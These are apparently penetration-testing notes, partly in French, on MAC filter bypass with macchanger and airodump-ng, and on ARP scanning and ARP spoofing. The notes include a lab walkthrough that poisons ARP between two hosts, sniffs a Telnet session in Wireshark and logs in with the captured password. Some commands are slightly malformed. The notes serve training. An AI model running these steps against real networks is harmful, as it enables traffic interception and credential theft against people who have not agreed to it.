ARP = Address Resolution Protocol (RFC 826) = resolve IP to MAC

# MAC Filtering

```
# Ethernet 
sudo macchanger -a eth0

# WiFi 
sudo airmon-ng start wlan0

# Trouver des MAC whitelisted 
$ airodump-ng –c [channel]–bssid [target router MAC Address]–i wlan0mon

sudo airmon-ng stop wlan0mon
sudo ifconfig wlan0 down
sudo macchanger -m [New MAC Address] wlan0 sudo ifconfig wlan0 up
```

# ARP Scan
`sudo arp-scan -I eth0 -g 10.10.10.0/24`

# ARP Spoofing
`echo 1 > /proc/sys/net/ipv4/ip_forward`
`arpspoof -i <inteface> -t <target> -r <host>`


# ARP Poisoning
Imagine our Kali IP is `10.100.13.140/24`

Let’s run an nmap scan on `nmap 10.100.13.0/24`

We found a couple of machines on the network.
Let’s check that on Wireshark.
We can try to ping another address in the network, and see the results on Wireshark :

`ping 10.100.13.37`

We see the packets on Wireshark. Let’s pretend to be someone else, and see if we can receive other packets !

`echo 1 > /proc/sys/net/ipv4/ip_forward`

`arpspoof -i eth0 -t 10.100.13.37 -r 10.100.13.36`

Here with arpspoof we said to IP `10.100.13.36` that we were `10.100.13.37` , and we’re now able to receive packets from 10.100.13.37 !

We then found an interesting packets. We’re going to filter the received packets with `telnet` filter and `Right click -> Follow -> TCP Stream` to have to complete conver

And we can retrieve a password !

We can then connect to Telnet using `telnet 10.100.13.36` and the found credentials !


